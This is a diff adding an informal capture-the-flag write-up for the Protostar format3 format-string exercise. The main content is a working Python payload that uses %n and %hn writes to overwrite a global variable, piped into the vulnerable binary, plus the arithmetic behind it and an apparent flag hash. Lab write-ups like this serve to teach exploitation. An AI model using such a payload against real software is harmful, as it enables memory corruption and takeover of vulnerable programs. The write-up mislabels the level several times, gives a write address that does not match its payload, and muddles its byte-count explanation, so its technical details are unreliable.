@@ -1,0 +1,27 @@
+Protostar format3:
+
+We want to break free... Oh, sorry, it wasn't the point (Yes, we can copy/past too !).
+We want to be level 5 !
+How to do that ? Simple, disassemble the program level3:
+
+We see that main calls a function v (vuln ?)
+
+We see a format string but with "fgets" and "printf"
+We want to make the condition "0x08048492 <+59>: cmp $0x1025544,%eax" from "0x0804848d <+54>: mov 0x8049810,%eax" true
+So we want to put 0x01025544 at 0x080484df
+
+0x01025544 -> 0x0102 0x5544 -> 258 21828
+								258 - 8 -> 250
+								21828 - 258 -> 21570
+
+Simple:
+	python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%.249d%13$n" + "%.21569d%12$hn"' > /tmp/level4 && cat /tmp/level4 - | ./level4
+
+	Explanation: 2 parts, address in 64bit using 32bit ints:
+		.249d -> Value decimal 249 + nb_written -> 249 + 8 -> 257 (0x0101) at address \x10\x98\x04\x08
+		.21569d -> Value decimal 21569 + nb_written -> 21569 + 257 -> 21826 (0x5542) at address \x12\x98\x04\x08
+
+		Why less 1 for each ? Bruteforcing, poneys and stuffs (gdb)
+	Tadaaa !!!
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
